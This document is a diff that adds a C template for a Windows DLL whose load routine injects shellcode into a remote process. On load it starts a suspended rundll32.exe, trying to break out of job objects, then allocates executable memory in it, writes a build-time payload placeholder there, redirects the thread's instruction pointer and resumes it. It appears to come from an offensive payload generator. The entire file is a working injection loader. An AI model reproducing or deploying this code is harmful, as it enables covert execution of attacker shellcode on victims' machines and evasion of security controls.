@@ -1,0 +1,220 @@
+#include <Windows.h>
+#include <stdlib.h>
+
+#define CREATE_SUSPENDED 0x00000004
+#define IDLE_PRIORITY_CLASS 0x00000040
+#define CREATE_BREAKAWAY_FROM_JOB 0x01000000
+
+#define SCSIZE <%= payload_length %> 
+unsigned char code[SCSIZE] = "<%= payload %>";
+
+char szSyncNameS[MAX_PATH] = "Local\\Semaphore:Default\0";
+char szSyncNameE[MAX_PATH] = "Local\\Event:Default\0";
+
+typedef unsigned __int64 DWORD64, *PDWORD64;
+typedef unsigned __int64 ULONGLONG;
+typedef __int64 LONGLONG;
+
+
+typedef struct _M128A
+{
+    ULONGLONG Low;
+    LONGLONG High;
+} M128A;
+
+typedef struct _NEON128 {
+    ULONGLONG Low;
+    ULONGLONG High;
+} NEON128, *PNEON128;
+
+typedef struct
+{
+    WORD ControlWord;
+    WORD StatusWord;
+    BYTE TagWord;
+    BYTE Reserved1;
+    WORD ErrorOpcode;
+    DWORD ErrorOffset;
+    WORD ErrorSelector;
+    WORD Reserved2;
+    DWORD DataOffset;
+    WORD DataSelector;
+    WORD Reserved3;
+    DWORD MxCsr;
+    DWORD MxCsr_Mask;
+    M128A FloatRegisters[8];
+    M128A XmmRegisters[16];
+    BYTE Reserved4[96];
+} XMM_SAVE_AREA32;
+
+
+typedef struct _CONTEXT {
+  DWORD64 P1Home;
+  DWORD64 P2Home;
+  DWORD64 P3Home;
+  DWORD64 P4Home;
+  DWORD64 P5Home;
+  DWORD64 P6Home;
+  DWORD   ContextFlags;
+  DWORD   MxCsr;
+  WORD    SegCs;
+  WORD    SegDs;
+  WORD    SegEs;
+  WORD    SegFs;
+  WORD    SegGs;
+  WORD    SegSs;
+  DWORD   EFlags;
+  DWORD64 Dr0;
+  DWORD64 Dr1;
+  DWORD64 Dr2;
+  DWORD64 Dr3;
+  DWORD64 Dr6;
+  DWORD64 Dr7;
+  DWORD64 Rax;
+  DWORD64 Rcx;
+  DWORD64 Rdx;
+  DWORD64 Rbx;
+  DWORD64 Rsp;
+  DWORD64 Rbp;
+  DWORD64 Rsi;
+  DWORD64 Rdi;
+  DWORD64 R8;
+  DWORD64 R9;
+  DWORD64 R10;
+  DWORD64 R11;
+  DWORD64 R12;
+  DWORD64 R13;
+  DWORD64 R14;
+  DWORD64 R15;
+  DWORD64 Rip;
+  union {
+    XMM_SAVE_AREA32 FltSave;
+    NEON128         Q[16];
+    ULONGLONG       D[32];
+    struct {
+      M128A Header[2];
+      M128A Legacy[8];
+      M128A Xmm0;
+      M128A Xmm1;
+      M128A Xmm2;
+      M128A Xmm3;
+      M128A Xmm4;
+      M128A Xmm5;
+      M128A Xmm6;
+      M128A Xmm7;
+      M128A Xmm8;
+      M128A Xmm9;
+      M128A Xmm10;
+      M128A Xmm11;
+      M128A Xmm12;
+      M128A Xmm13;
+      M128A Xmm14;
+      M128A Xmm15;
+    } DUMMYSTRUCTNAME;
+    DWORD           S[32];
+  } DUMMYUNIONNAME;
+  M128A   VectorRegister[26];
+  DWORD64 VectorControl;
+  DWORD64 DebugControl;
+  DWORD64 LastBranchToRip;
+  DWORD64 LastBranchFromRip;
+  DWORD64 LastExceptionToRip;
+  DWORD64 LastExceptionFromRip;
+} CONTEXT, *PCONTEXT;
+
+typedef BOOL (__stdcall *fnGetThreadContext_t)(HANDLE hThread, CONTEXT* lpContext);
+typedef BOOL (__stdcall *fnSetThreadContext_t)(HANDLE hThread, const CONTEXT *lpContext);
+typedef DWORD (__stdcall *fnResumeThread_t)(HANDLE hThread);
+typedef VOID (__stdcall *fnExitThread_t)(DWORD dwExitCode);
+
+
+void  *memset(void *b, int c, int len)
+{
+  int           i;
+  unsigned char *p = b;
+  i = 0;
+  while(len > 0)
+    {
+      *p = c;
+      p++;
+      len--;
+    }
+  return(b);
+}
+
+void ExecutePayload(void);
+
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
+{
+	switch (dwReason)
+	{
+		case DLL_PROCESS_ATTACH:
+			ExecutePayload();
+			break;
+
+		case DLL_PROCESS_DETACH:
+			// Code to run when the DLL is freed
+			break;
+
+		case DLL_THREAD_ATTACH:
+			// Code to run when a thread is created during the DLL's lifetime
+			break;
+
+		case DLL_THREAD_DETACH:
+			// Code to run when a thread ends normally.
+			break;
+	}
+	return TRUE;
+}
+
+
+BOOL Synchronize(void) {
+	return TRUE;
+}
+
+void ExecutePayload(void) {
+	int error;
+	PROCESS_INFORMATION pi;
+	STARTUPINFO si;
+	CONTEXT ctx;
+	DWORD prot;
+	LPVOID ep;
+
+	// Start up the payload in a new process
+	memset( &si, 0, sizeof( si ));
+	si.cb = sizeof(si);
+
+	if (Synchronize()) {
+		// Create a suspended process, write shellcode into stack, make stack RWX, resume it
+		DWORD result = CreateProcess(NULL, "rundll32.exe", NULL, NULL, TRUE, CREATE_SUSPENDED|IDLE_PRIORITY_CLASS|CREATE_BREAKAWAY_FROM_JOB, NULL, NULL, &si, &pi);
+		
+		// If we fail, try again without the CREATE_BREAKAWAY_FROM_JOB flag in the event that we are in a job but we can't break away from it.
+		if (result == FALSE){
+			result = CreateProcess(NULL, "rundll32.exe", NULL, NULL, TRUE, CREATE_SUSPENDED|IDLE_PRIORITY_CLASS, NULL, NULL, &si, &pi);
+		}
+
+		if (result) {
+			ctx.ContextFlags = 0x00100003; 
+			
+			fnGetThreadContext_t pGetThreadContext = (fnGetThreadContext_t)GetProcAddress(GetModuleHandle("kernel32.dll"), "GetThreadContext");
+			pGetThreadContext(pi.hThread, &ctx);
+
+			ep = (LPVOID) VirtualAllocEx(pi.hProcess, NULL, SCSIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+			WriteProcessMemory(pi.hProcess,(PVOID)ep, &code, SCSIZE, 0);
+
+			ctx.Rip = (DWORD64)ep;
+			
+			fnSetThreadContext_t pSetThreadContext = (fnSetThreadContext_t)GetProcAddress(GetModuleHandle("kernel32.dll"), "SetThreadContext");
+
+			pSetThreadContext(pi.hThread,&ctx);
+			
+			fnResumeThread_t pResumeThread = (fnResumeThread_t)GetProcAddress(GetModuleHandle("kernel32.dll"), "ResumeThread");
+			pResumeThread(pi.hThread);
+			CloseHandle(pi.hThread);
+			CloseHandle(pi.hProcess);
+		}
+	}
+	fnExitThread_t pExitThread = (fnExitThread_t)GetProcAddress(GetModuleHandle("kernel32.dll"), "ExitThread");
+	pExitThread(0);
+}
